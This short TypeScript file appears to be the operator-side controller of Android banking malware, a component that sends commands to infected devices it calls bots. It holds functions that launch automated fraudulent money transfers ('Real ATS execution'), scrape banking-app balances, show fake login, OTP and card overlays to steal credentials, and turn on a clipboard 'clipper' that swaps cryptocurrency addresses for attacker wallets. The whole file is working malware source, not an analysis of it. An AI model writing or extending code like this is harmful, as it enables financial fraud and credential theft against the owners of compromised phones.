import { dbApi } from './database.js';
import { sendToBot } from './ws.js';
import type { WalletSet } from './types.js';

export const setWallet = (botId: string, w: WalletSet) => dbApi.setWallet(botId, w);
export const getWallet = (botId: string): WalletSet | undefined => dbApi.getWallet(botId);

export interface AtsRequest { botId: string; target: string; amount: string; currency: string }

/** Real ATS execution — consumed by AtsEngine on device (ThreatFabric pattern). */
export function startAts(req: AtsRequest): boolean {
  return sendToBot(req.botId, 'ats_transfer', JSON.stringify({
    target: req.target, amount: req.amount, currency: req.currency,
    wallet: getWallet(req.botId) || null,
  }));
}

export const scrapeBalance = (botId: string, app: string): boolean =>
  sendToBot(botId, 'balance_scrape', JSON.stringify({ app }));

export const deployOverlay = (botId: string, app: string, kind: 'login' | 'otp' | 'card'): boolean =>
  sendToBot(botId, 'overlay_show', JSON.stringify({ app, kind }));

export function enableClipper(botId: string): boolean {
  const w = getWallet(botId);
  if (!w || (!w.eth && !w.btc && !w.trx)) return false;
  return sendToBot(botId, 'clipper_on', JSON.stringify(w));
}
